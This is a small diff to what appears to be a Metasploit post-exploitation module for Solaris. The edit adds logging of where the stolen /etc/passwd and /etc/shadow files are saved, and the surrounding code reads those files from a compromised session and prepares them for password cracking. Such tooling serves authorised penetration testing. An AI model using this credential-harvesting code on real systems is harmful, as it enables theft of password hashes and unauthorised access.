@@ -37,8 +37,10 @@ class Metasploit3 < Msf::Post
 			shadow_file = read_file("/etc/shadow")
 
 			# Save in loot the passwd and shadow file
-			store_loot("solaris.shadow", "text/plain", session, shadow_file, "shadow.tx", "Solaris Password Shadow File")
-			store_loot("solaris.passwd", "text/plain", session, passwd_file, "passwd.tx", "Solaris Passwd File")
+			p1 = store_loot("solaris.shadow", "text/plain", session, shadow_file, "shadow.tx", "Solaris Password Shadow File")
+			p2 = store_loot("solaris.passwd", "text/plain", session, passwd_file, "passwd.tx", "Solaris Passwd File")
+			vprint_status("Shadow saved in: #{p1.to_s}")
+			vprint_status("passwd saved in: #{p2.to_s}")
 
 			# Unshadow the files
 			john_file = unshadow(passwd_file, shadow_file)
